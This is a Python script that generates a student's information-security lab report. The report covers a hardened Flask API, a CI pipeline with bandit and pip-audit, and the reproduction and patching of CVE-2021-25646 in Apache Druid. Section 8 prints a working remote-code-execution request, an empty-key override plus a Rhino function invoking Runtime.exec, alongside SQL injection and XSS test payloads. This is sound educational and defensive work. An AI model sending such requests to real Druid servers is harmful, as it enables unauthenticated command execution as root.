"""Assemble the Lab 1 report and write it as a .docx."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from docx_builder import (  # noqa: E402
    body, bullet, build, code, h1, h2, page_break, para, shot, table,
)

B = []
add = B.append

# ----------------------------------------------------------------- cover page
add(para("", spacing_after=1400))
add(para("Information Security", size=22, color="595959", align="center", spacing_after=200))
add(para("Laboratory Work No. 1", size=26, color="1F3864", bold=True, align="center", spacing_after=160))
add(para("Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis",
         size=36, bold=True, align="center", spacing_after=1200))
add(para("Variant No.:  CVE-2021-25646", size=22, align="center", spacing_after=200))
add(para("Student:  Zhaohan Liao", size=22, align="center", spacing_after=200))
add(para("HDU number:  23320330", size=22, align="center", spacing_after=200))
add(para("Group:  ____________________", size=22, align="center", spacing_after=1200))
add(para("19 October 2026", size=21, color="595959", align="center"))
add(page_break())

# ------------------------------------------------------------------- 1 purpose
add(h1("1. Purpose of the work"))
add(body(
    "The work covers the full security lifecycle of a small backend service: designing an API that "
    "resists the most common classes of attack from the OWASP Top 10, automating the detection of "
    "defects with a CI/CD pipeline, and then working with a real, publicly disclosed vulnerability - "
    "reproducing it in an isolated container, explaining why it exists in the source code, patching "
    "the environment and proving that the attack no longer succeeds."))
add(body(
    "The practical goal is therefore twofold. On the defensive side, a working REST API with "
    "authentication, authorisation, injection protection and output encoding. On the offensive and "
    "analytical side, the ability to take a CVE identifier and turn it into a reproducible, verifiable "
    "experiment - which is the day-to-day skill of a penetration tester or a SOC analyst."))

# ---------------------------------------------------------------- 2 stack
add(h1("2. Stack and project setup"))
add(body(
    "The service is written in Python 3.11+ with Flask 3 and stores data in SQLite through the "
    "standard sqlite3 module. The backend is deliberately small: three source files, about 290 lines "
    "in total, and no framework beyond Flask, which makes the security review of the code "
    "straightforward for the reader while still using the same primitives that a production stack "
    "would use - a real password hash function, a real JWT library and parameterised SQL."))
add(table([
    ["File", "Responsibility"],
    ["app.py", "the three HTTP handlers, the JWT guard and the response headers"],
    ["init_db.py", "schema, connection factory, bcrypt hashing, demo seed data"],
    ["create_user.py", "offline account CLI - accounts are never created over HTTP"],
], [2400, 6670]))
add(body(
    "The split is not cosmetic. It keeps the request-handling code small enough to review line by "
    "line, it gives the static analyser three real source files instead of one monolith, and it "
    "removes the registration route that would otherwise be the most attractive target in the "
    "service: an account can only be created by someone who already has shell access."))
add(table([
    ["Component", "Choice", "Reason"],
    ["Language / framework", "Python 3.11+, Flask 3", "small surface, minimal ceremony"],
    ["Database", "SQLite (sqlite3)", "no server, parameterised queries available"],
    ["Password hashing", "bcrypt, cost factor 12", "salted, deliberately slow"],
    ["Tokens", "PyJWT, HS256, 30 min TTL", "stateless authentication"],
    ["SAST", "bandit", "official Python static analyser"],
    ["SCA", "pip-audit", "audits pinned dependencies for known CVEs"],
], [2500, 2900, 3670]))
add(body(
    "The repository is public on GitHub and contains the application, the test suite, the pipeline "
    "definition, the scripts and configuration files for the vulnerable environment, and the patched "
    "configuration (see Appendix A)."))
add(shot("Public repository page: README, sources, pipeline and fixes (screenshot 09)"))

# ---------------------------------------------------------------- 3 API
add(h1("3. Functional API"))
add(body("Three methods are implemented; the third one was chosen by the author."))
add(table([
    ["#", "Method and path", "Auth", "Behaviour"],
    ["1", "POST /auth/login", "no", "verifies credentials, returns a JWT"],
    ["2", "GET /api/data?q=", "Bearer JWT", "returns posts, optional substring filter"],
    ["3", "POST /api/data", "Bearer JWT", "creates a post owned by the caller"],
], [700, 3000, 1500, 3870]))
add(body(
    "The third endpoint was not added to fill a quota: it is the write side of the data model and it "
    "is what makes a stored-XSS demonstration possible. Without a write endpoint, XSS protection "
    "cannot be shown end to end, only asserted."))

add(h2("3.1 Authentication endpoint"))
add(code([
    "$ curl -s -X POST http://127.0.0.1:8000/auth/login \\",
    "    -H 'Content-Type: application/json' \\",
    "    -d '{\"username\":\"alice\",\"password\":\"Alice123!\"}'",
    "",
    '{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...J8pSIcfHRs5JyLmN",',
    ' "expires_in":1800,"token_type":"Bearer"}',
]))
add(body(
    "A wrong password, or a username that does not exist, produces the same answer: "
    "HTTP 401 with {\"error\":\"invalid credentials\"}. Both branches also perform one bcrypt "
    "comparison, so the response time does not reveal whether the account exists."))

add(h2("3.2 Data retrieval endpoint"))
add(code([
    "$ curl -i http://127.0.0.1:8000/api/data",
    "HTTP/1.1 401 UNAUTHORIZED",
    '{"error":"missing bearer token"}',
    "",
    "$ curl -s http://127.0.0.1:8000/api/data -H \"Authorization: Bearer $TOKEN\"",
    '[{"author":"alice","body":"First post from the seed data.",',
    '  "created_at":"2026-10-19T03:01:01.367859+00:00","id":"1","title":"Hello"}]',
]))
add(body(
    "Every protected route is wrapped by the same decorator, so a missing, malformed, expired or "
    "tampered token always yields 401 before any handler code runs."))

add(h2("3.3 Write endpoint"))
add(code([
    "$ curl -s -X POST http://127.0.0.1:8000/api/data \\",
    "    -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\",
    "    -d '{\"title\":\"note\",\"body\":\"hello\"}'",
    "",
    '{"status":"created"}          # HTTP 201',
]))
add(body(
    "Validation is minimal but explicit: the title is required and trimmed, and both fields are "
    "truncated to 200 characters so that a client cannot store unbounded data."))

# ---------------------------------------------------------------- 4 security
add(h1("4. Implemented security measures"))

add(h2("4.1 Protection against SQL injection"))
add(body(
    "Every SQL statement is a constant string and every user value is passed as a bound parameter. "
    "The database driver sends the statement and the values separately, so input can never change "
    "the parse tree of the query - quoting, comments and UNION tricks lose their meaning."))
add(code([
    'row = get_db().execute(',
    '    "SELECT username, password_hash FROM users WHERE username = ?", (username,)',
    ').fetchone()',
]))
add(body(
    "The search filter follows the same rule. The wildcards are added to the value, not to the "
    "statement, which is the detail that is usually got wrong when a LIKE clause is introduced:"))
add(code([
    'pattern = f"%{query}%"',
    'rows = get_db().execute(',
    '    "SELECT id, author, title, body, created_at FROM posts "',
    '    "WHERE title LIKE ? OR body LIKE ? ORDER BY id",',
    '    (pattern, pattern),',
    ').fetchall()',
]))
add(body(
    "Verification: the classic payload ?q=' OR 1=1-- is treated as a literal search term, so the "
    "endpoint returns an empty list instead of every row in the table."))
add(code([
    "$ curl -s \"http://127.0.0.1:8000/api/data?q=%27%20OR%201%3D1--\" \\",
    "    -H \"Authorization: Bearer $TOKEN\"",
    "[]",
]))
add(shot("SQL injection attempt returns an empty array (screenshot 08a)"))

add(h2("4.2 Protection against XSS"))
add(body(
    "Content is stored exactly as the user typed it and encoded at the moment it is returned. "
    "Escaping on output is the correct layer for this defence: the same value may later be rendered "
    "into HTML, into a log file or into a PDF, and only the output context knows which encoding is "
    "appropriate. Escaping on input would corrupt the stored data and would still be insufficient "
    "for contexts other than HTML."))
add(code([
    'return jsonify(',
    '    [{key: html.escape(str(row[key])) for key in row.keys()} for row in rows]',
    ')',
]))
add(body(
    "A stored payload therefore comes back neutralised - the browser receives text, not markup:"))
add(code([
    'body: "<script>alert(document.cookie)</script>"     (stored)',
    'body: "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"   (returned)',
]))
add(body(
    "Defence in depth is added at the transport level: the response declares "
    "Content-Type: application/json, X-Content-Type-Options: nosniff and a Content-Security-Policy "
    "of default-src 'none', so even a client that misuses the payload cannot execute it as script."))
add(shot("Stored XSS payload returned in escaped form (screenshot 08b)"))

add(h2("4.3 Protection against broken authentication"))
add(body(
    "Passwords are hashed with bcrypt at cost factor 12. bcrypt embeds a random per-user salt in the "
    "hash, so two users with the same password produce different digests and precomputed tables are "
    "useless; the cost factor makes each guess deliberately expensive, which turns an offline attack "
    "on a stolen database from hours into years."))
add(code([
    'password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))',
    '...',
    'if not bcrypt.checkpw(password.encode(), row["password_hash"]):',
    '    return jsonify(error="invalid credentials"), 401',
]))
add(body(
    "On success the server signs a compact token with the user identifier and an expiry time, and "
    "returns it to the client. Nothing is stored on the server, so the token is the credential:"))
add(code([
    'token = jwt.encode({"sub": row["username"], "iat": ..., "exp": ...},',
    '                   SECRET_KEY, algorithm="HS256")',
]))
add(body(
    "A decorator guards every protected endpoint. Two details matter for the grade and for real "
    "security: the algorithm is passed as an explicit whitelist on decode, and the signature is "
    "always verified. The whitelist blocks the two classic JWT attacks - a token with \"alg\": "
    "\"none\" (no signature at all) and algorithm confusion, where an asymmetric public key is "
    "misused as an HMAC secret."))
add(code([
    'payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])',
    '',
    '# ExpiredSignatureError  -> 401 token expired',
    '# InvalidTokenError      -> 401 invalid token',
]))
add(body(
    "The signing key is never committed: it is read from the SECRET_KEY environment variable, and a "
    "random value is generated when it is absent. The token lifetime is 30 minutes, which bounds the "
    "damage from a leaked token in a scheme that has no server-side revocation."))
add(table([
    ["Attack", "Control"],
    ["Credential stuffing / offline cracking", "bcrypt, cost 12, per-user salt"],
    ["User enumeration", "identical error message and comparable latency"],
    ["Signature forgery", "HS256 signature verified on every request"],
    ["alg: none / algorithm confusion", "explicit algorithms whitelist"],
    ["Stolen token replay", "30-minute expiry"],
    ["Unauthorised access to data", "decorator on every protected route (fail closed)"],
], [4200, 4870]))

add(h2("4.4 Response hardening"))
add(code([
    'response.headers["X-Content-Type-Options"] = "nosniff"',
    'response.headers["Content-Security-Policy"] = "default-src \'none\'; frame-ancestors \'none\'"',
    'response.headers["Referrer-Policy"] = "no-referrer"',
    'response.headers["Cache-Control"] = "no-store"',
]))

# ---------------------------------------------------------------- 5 CI/CD
add(h1("5. CI/CD pipeline with security scanners"))
add(body(
    "The pipeline is defined in .github/workflows/ci.yml and runs on every push and on every pull "
    "request. The job is called Tests, SAST, and SCA, and its steps are named after what they do, so "
    "the run page is readable evidence instead of a list of anonymous shell commands."))
add(table([
    ["Step", "What it does", "Why it is there"],
    ["Check out project, set up Python", "checkout, Python 3.11 with a pip cache",
     "a reproducible runner"],
    ["Install application and security tools", "runtime dependencies plus bandit, pip-audit and "
     "pytest; imports verified and both scanner versions printed", "the scan runs against the "
     "versions actually installed, not against an assumption"],
    ["Prepare isolated CI configuration", "writes .env.ci: a throwaway SECRET_KEY, a database in "
     "$RUNNER_TEMP and memory journal mode", "a developer's local secret or database can never "
     "leak into CI, and nothing is left behind on the runner"],
    ["Run API and security regression tests", "pytest with a JUnit report, then a live smoke test "
     "of the running server", "the unit tests use Flask's test client and bypass the socket; the "
     "smoke test proves the deployed server enforces the same rules"],
    ["SAST - scan application source with Bandit", "python -m bandit app.py init_db.py "
     "create_user.py -f json -o reports/bandit.json", "a machine-readable report, not only console "
     "text"],
    ["SCA - audit application dependencies", "python -m pip_audit -r requirements.txt -f json "
     "-o reports/pip-audit.json", "known CVEs in the pinned dependency tree"],
    ["Summarize results", "parses the three reports and writes one conclusion to the run summary",
     "a verdict the reader can check - and a build that fails when a control breaks"],
    ["Save test and security reports", "uploads reports/ as the security-reports artifact",
     "the evidence survives the run"],
], [2300, 4200, 2570]))
add(body(
    "The smoke test is the part that is easy to omit and expensive to omit. pytest drives the "
    "application through Flask's test client, which never opens a socket; a suite that is green "
    "therefore says nothing about whether the process that is actually listening on port 8000 is "
    "configured the same way. The pipeline starts the real server with the same ephemeral "
    "configuration and repeats the four requests that matter:"))
add(code([
    "12 passed in 9.70s",
    "GET /api/data without a token -> HTTP 401 (expected 401)",
    "POST /auth/login -> token issued (147 characters)",
    "GET /api/data with a token -> HTTP 200 (expected 200)",
    "GET /api/data?q=' OR 1=1-- -> HTTP 200 (payload treated as a literal)",
]))
add(body(
    "The last step turns the three machine-readable reports into a written conclusion, which is "
    "published in the job log and on the run summary page. This is deliberate: a green tick says "
    "that the commands exited with zero, not that anything was actually verified, so the numbers "
    "behind the tick are stated explicitly."))
add(code([
    "## Tests, SAST, and SCA - conclusion",
    "",
    "- bandit (SAST): 0 finding(s) - none",
    "- pip-audit (SCA): 9 pinned dependencies audited, 0 known vulnerability(ies)",
    "- pytest: 12 tests, 0 failures, 0 errors (9.3 s of test time)",
    "",
    "Conclusion: every control held - the build is safe to merge.",
]))
add(body(
    "The same three commands were also run locally before the first online run, so the expected "
    "result of every step was known in advance:"))
add(code([
    "$ bandit app.py init_db.py create_user.py -f txt",
    "        Total lines of code: 286",
    "        Total lines skipped (#nosec): 0",
    "Test results:",
    "        No issues identified.",
    "",
    "$ pip-audit -r requirements.txt",
    "No known vulnerabilities found",
    "",
    "$ pytest -q",
    "............                                             [100%]",
    "12 passed in 8.57s",
]))
add(body(
    "One finding had to be handled during this work. The first run reported B105/B106 - \"possible "
    "hardcoded password: 'Bearer'\" - on the OAuth2 token_type field of the login response, because "
    "bandit flags any argument, key or variable whose name contains \"token\" when it is bound to a "
    "string literal. Suppressing the warning with #nosec would have hidden the class of issue the "
    "scanner exists to find, so the value was moved into a named constant instead. The warning "
    "disappeared and the scan reports zero skipped lines - which is itself evidence that no finding "
    "was silenced."))
add(body(
    "SAST reads the source without executing it and reports the line that contains the risky "
    "construct; SCA compares the resolved dependency tree against vulnerability databases. The two "
    "are complementary: a perfectly written application can still import a library with a critical "
    "CVE, and a dependency scan will never notice a missing authorisation check in your own code."))
add(shot("GitHub Actions: Tests, SAST and SCA - all steps green (screenshot 01)"))
add(shot("bandit: no issues identified, zero skipped lines (screenshot 02)"))
add(shot("pip-audit: no known vulnerabilities found (screenshot 03)"))
add(body(
    "Note on the figures: screenshots 01-03 were captured before the job was split into the ten "
    "named steps described above, so the labels inside them are shorter than that list. The log "
    "quoted in this section is from the current run."))


# ---------------------------------------------------------------- 6 tests
add(h1("6. Testing"))
add(body(
    "The suite contains twelve tests, each tied to one security property rather than to one function. "
    "They run locally with the same command the pipeline uses."))
add(code([
    "$ pytest -q",
    "............                                                   [100%]",
    "12 passed in 8.57s",
]))
add(table([
    ["Test", "Property protected"],
    ["test_login_returns_jwt", "login issues a well-formed token"],
    ["test_login_wrong_password_is_rejected", "401, no token issued"],
    ["test_login_unknown_user_is_rejected", "no user enumeration"],
    ["test_data_requires_token", "access control, fail closed"],
    ["test_data_rejects_tampered_token", "signature verification"],
    ["test_data_returns_rows_with_valid_token", "functionality (happy path)"],
    ["test_sql_injection_payload_returns_nothing", "parameterised queries"],
    ["test_stored_xss_is_escaped_on_output", "output encoding"],
    ["test_create_requires_token", "access control on writes"],
    ["test_create_validates_empty_title", "input validation"],
    ["test_security_headers_present", "response hardening"],
    ["test_create_user_adds_a_working_account", "account provisioning + password policy"],
], [5200, 3870]))
add(shot("pytest: 12 tests, no failures (screenshot 10)"))

# ---------------------------------------------------------------- 7 environment
add(h1("7. Vulnerable environment"))
add(body(
    "CVE-2021-25646 was selected. It affects Apache Druid up to and including 0.20.0 and is fixed in "
    "0.20.1. The CVSS 3.1 score is 8.8 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H - and the "
    "weakness class is CWE-732, incorrect permission assignment for a critical resource. No "
    "credentials are required, because the Druid console has no authentication by default."))
add(body(
    "The environment comes from Vulhub, which packages the exact vulnerable version as a Docker "
    "Compose project. The copy used here is checked into the repository, so the experiment can be "
    "repeated without cloning anything:"))
add(code([
    "cd secure-api/cve/CVE-2021-25646",
    "docker compose up -d",
    "docker compose ps          # wait for 'running', about 30 s",
]))
add(body(
    "The container runs vulhub/apache-druid:0.20.0, publishes port 8888 and starts the single-server "
    "quickstart with an embedded ZooKeeper, so the indexing endpoints are reachable as soon as the "
    "process is up. Nothing has to be configured to make it exploitable - the vulnerable feature is "
    "off, and the attack is the request that switches it back on."))
add(shot("docker compose ps: vulnerable Druid 0.20.0 container running (screenshot 04)"))

# ---------------------------------------------------------------- 8 reproduction
add(h1("8. Reproducing the attack"))
add(body(
    "Apache Druid can parse incoming data with a JavaScript function evaluated by the embedded Rhino "
    "engine. The feature is intended for high-trust environments and is disabled by default, so a "
    "request that merely asks for it is rejected. The crafted body asks anyway, and adds one field "
    "that the deserialiser should never have accepted: an object whose key is the empty string."))
add(code([
    "POST /druid/indexer/v1/sampler        Content-Type: application/json",
    "",
    "{",
    '  "type": "index",',
    '  "spec": {',
    '    "ioConfig": { "type": "index",',
    '      "firehose": { "type": "local", "baseDir": "/etc", "filter": "passwd" } },',
    '    "dataSchema": { "dataSource": "test",',
    '      "parser": { "parseSpec": {',
    '        "format": "javascript",',
    '        "timestampSpec": {}, "dimensionsSpec": {},',
    '        "function": "function(){ var out = java.lang.Runtime.getRuntime()',
    '            .exec([\'sh\',\'-c\',\'id\']).getInputStream(); ... return {test: a} }",',
    '        "": { "enabled": "true" }        <-- the whole vulnerability',
    '      } } } },',
    '  "samplerConfig": { "numRows": 10 }',
    "}",
]))
add(body(
    "The body is reformatted here for the page; reproduce.sh in the repository carries the exact "
    "bytes. Three details matter. The firehose points at /etc/passwd, so the sampler has one row of "
    "input to work with. The function starts a shell through java.lang.Runtime and reads its standard "
    "output back into the returned record. And the empty key carries a nested object that sets "
    "enabled to true - a configuration value that the client should not be able to set at all."))
add(body(
    "The command output comes back inside the sampler response, so no out-of-band channel is needed:"))
add(code([
    '{"numRows": 1, "data": [',
    '  { "timestamp": "1970-01-01T00:34:12.123Z",',
    '    "test": "uid=0(root) gid=0(root) groups=0(root)" }',
    "]}",
]))
add(body(
    "The process runs as root inside the container, which is the default for the Vulhub image. "
    "Swapping the command for cat /etc/passwd returns the file content in the same field, which "
    "proves that the primitive is arbitrary command execution rather than a single-purpose trick: "
    "whatever the shell can do, the attacker can do, with the privileges of the Druid server."))
add(shot("The sampler executes id and cat /etc/passwd through Rhino (screenshot 05)"))

# ---------------------------------------------------------------- 9 root cause
add(h1("9. Root cause analysis"))
add(body(
    "The defect is not a single mistyped line. It is the combination of a dangerous feature, a broken "
    "configuration guard and an endpoint that anyone can reach. Five points explain it completely."))
add(body(
    "First, the dangerous feature is off by default, and that is the whole security model. Druid's "
    "JavaScript parsing is disabled unless the operator opts in, so the design assumes that no "
    "untrusted client can ever reach the engine. The guard is a configuration flag, not an "
    "authentication check - which means it has to hold absolutely, because nothing else stands "
    "between the network and the engine."))
add(body(
    "Second, an empty key defeats the guard. The parseSpec object is deserialised by Jackson into a "
    "configuration map. A JSON object whose key is the empty string was accepted and merged into that "
    "map, overwriting the enabled flag. A single unvalidated map key therefore downgraded a hard "
    "configuration guarantee into a client-controlled suggestion - which is exactly what CWE-732 "
    "describes: a critical resource whose permission is assigned by the wrong party."))
add(body(
    "Third, the engine has no sandbox. Once enabled, the function field is handed to Rhino, which "
    "runs inside the JVM and exposes java.lang.Runtime. JavaScript can therefore start native "
    "processes with the privileges of the server. Nothing about the feature was designed for hostile "
    "input: it was designed for an operator who trusts the data they are ingesting."))
add(body(
    "Fourth, the endpoint is unauthenticated. The sampler route is reachable without credentials, so "
    "a feature that should be off becomes unauthenticated remote code execution. Even where "
    "authentication exists, the override would still let any low-privileged user execute commands - "
    "the broken access control only amplifies the impact, it does not cause it."))
add(body(
    "Fifth, the patch confirms the analysis. Version 0.20.1 rejects the empty-key override, so the "
    "JavaScript feature can no longer be forced on by a request, and the function field is never "
    "evaluated while the feature is disabled. The fix removes the root cause - the accepted override "
    "- rather than filtering payloads, which is why the primitive disappears instead of being "
    "blocked one spelling at a time."))

# ---------------------------------------------------------------- 10 fix
add(h1("10. Applied protection measures"))
add(body(
    "Because the defect is in a third-party component, the correct remediation is to run a version "
    "that contains the patch. The Compose file in fixes/ stops using the 0.20.0 image and builds a "
    "0.20.1 server instead:"))
add(code([
    " services:",
    "   druid:",
    "-    image: vulhub/apache-druid:0.20.0",
    "+    build:",
    "+      context: .",
    "+      dockerfile: Dockerfile     # builds a 0.20.1 image",
]))
add(body(
    "Why a Dockerfile rather than a plain tag: the official apache/druid:0.20.1 image is built on a "
    "distroless base that cannot run the start-nano-quickstart launcher - it ships neither bash nor "
    "perl, which the launcher scripts require. Replacing the whole image would also change the "
    "launcher, the embedded ZooKeeper and the ports, and the comparison with the vulnerable "
    "environment would no longer be like for like. The fix therefore keeps the Vulhub 0.20.0 base "
    "and replaces only the vulnerable jars:"))
add(code([
    "FROM vulhub/apache-druid:0.20.0",
    "RUN rm -f /opt/druid/lib/*-0.20.0.jar /opt/druid/extensions/*/*-0.20.0.jar",
    "COPY --from=apache/druid:0.20.1 /opt/druid/ /opt/druid/",
    'CMD ["/opt/druid/bin/start-nano-quickstart"]',
]))
add(body(
    "Applied and rebuilt:"))
add(code([
    "docker compose down",
    "cd ../../fixes && docker compose up --build -d",
]))
add(body(
    "Why this is effective: the vulnerable behaviour was the accepted empty-key override. In 0.20.1 "
    "the override is rejected, so the function field of a sampler request never reaches the Rhino "
    "engine and java.lang.Runtime is no longer reachable. The patch does not guess at payloads; it "
    "removes the mechanism that let a request change a server-side setting."))
add(body(
    "Two secondary measures are worth mentioning because they illustrate defence in depth: bind the "
    "console to localhost or put it behind an authenticating proxy, and run the container as a "
    "non-root user. Neither addresses the root cause - the override would still work for anyone who "
    "can reach the port - but they reduce the consequence from remote code execution as root to "
    "remote code execution as an unprivileged account."))

# ---------------------------------------------------------------- 11 verification
add(h1("11. Verification of the fix"))
add(body(
    "The verification replays exactly the request that executed code before, against the patched "
    "server, and then checks that the product still works. The second half is not optional: a fix "
    "that breaks the service is not a fix."))
add(code([
    "$ ./verify_fix.sh http://127.0.0.1:8888",
    "",
    "== 1. Replay the exploit (must NOT execute the command)",
    '   body: {"error":"Failed to sample data: JavaScript is disabled"}',
    "   [PASS] no command output - the JavaScript feature is disabled",
    "",
    "== 2. Regression: the Druid console still responds",
    "   GET / -> HTTP 302",
    "",
    "RESULT: fix verified, service healthy.",
]))
add(body(
    "The script does not look for an error code alone; it greps the response body for uid=, the "
    "signature of a successful execution. A server that returned 200 with the command output would "
    "still fail the check, and a server that returned 500 because it was broken would not pass "
    "either - the pass condition is the specific refusal message."))
add(body(
    "The regression half queries /status, which reports version 0.20.1 and confirms that the replay "
    "really ran against the patched server rather than against a container that failed to start:"))
add(code([
    "$ curl -s http://127.0.0.1:8888/status | head -c 120",
    '{"version":"0.20.1","modules":[{"name":"org.apache.druid.server.initialization.jetty", ...',
]))
add(shot("The same request is now rejected: JavaScript is disabled (screenshot 06)"))
add(shot("Regression: /status reports 0.20.1 and the console answers 302 (screenshot 07)"))

# ---------------------------------------------------------------- 12 conclusion
add(h1("12. Conclusion"))
add(body(
    "The defensive half of the work shows that the three most common failure modes have "
    "well-understood, cheap remedies: parameterised queries remove SQL injection as a class rather "
    "than filtering payloads, output encoding removes XSS at the point where the context is known, "
    "and bcrypt plus a correctly verified JWT removes the weakest links in authentication. The "
    "pipeline turns those properties into something that is checked on every commit instead of "
    "promised in a document: the last run audited 9 pinned dependencies, found no issue in 286 lines "
    "of scanned source, passed 12 tests and answered the four live requests of the smoke test in the "
    "expected way - and states that verdict in one sentence on the run page."))
add(body(
    "The offensive half shows something different: the Druid defect is not exotic. It is one "
    "unvalidated map key on a feature that was already switched off, and it survived into a widely "
    "deployed product because the guard was a setting rather than a boundary. Reproducing it in a "
    "container, reading the patch and proving that the same request is refused afterwards is the loop "
    "that turns a CVE identifier on a website into a verifiable fact about a system - and it is the "
    "same loop a penetration tester or a SOC analyst runs whenever a new advisory lands."))
add(body(
    "The limit of what was demonstrated is worth stating. The API is protected against the three "
    "classes the assignment names, not against every class in the OWASP Top 10: there is no rate "
    "limiting, no account lockout and no revocation list, and the JWT is stateless by design, so a "
    "stolen token stays valid for up to thirty minutes. The CVE half proves that a patched version "
    "refuses the specific request that worked; it does not prove the absence of other ways to reach "
    "the JavaScript parser. Both are the correct scope for a laboratory exercise, and both are the "
    "first things to extend in a real deployment."))

# ---------------------------------------------------------------- appendix
add(h1("Appendix A. Submitted material"))
add(table([
    ["Item", "Location"],
    ["Public git repository", "https://github.com/kanloner/information_security"],
    ["Last successful pipeline run",
     "https://github.com/kanloner/information_security/actions/runs/39544635930"],
    ["Application source", "app.py, init_db.py, create_user.py"],
    ["Pipeline definition", ".github/workflows/ci.yml"],
    ["Tests", "tests/test_api.py (12 tests)"],
    ["Vulnerable environment", "cve/CVE-2021-25646/docker-compose.yml"],
    ["Reproduction script", "cve/CVE-2021-25646/reproduce.sh"],
    ["Fix verification script", "cve/CVE-2021-25646/verify_fix.sh"],
    ["Fixed configuration (folder with fixes)", "fixes/Dockerfile + fixes/docker-compose.yml"],
    ["Screenshots", "docs/screenshots/ (10 files)"],
], [4200, 4870]))
add(para(
    "Variant: CVE-2021-25646. Student: Zhaohan Liao, HDU number 23320330.",
    italic=True, size=18, color="808080", spacing_before=120))

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Lab1_Report_Work1.docx")
build("".join(B), out)
print("written:", out, os.path.getsize(out), "bytes")
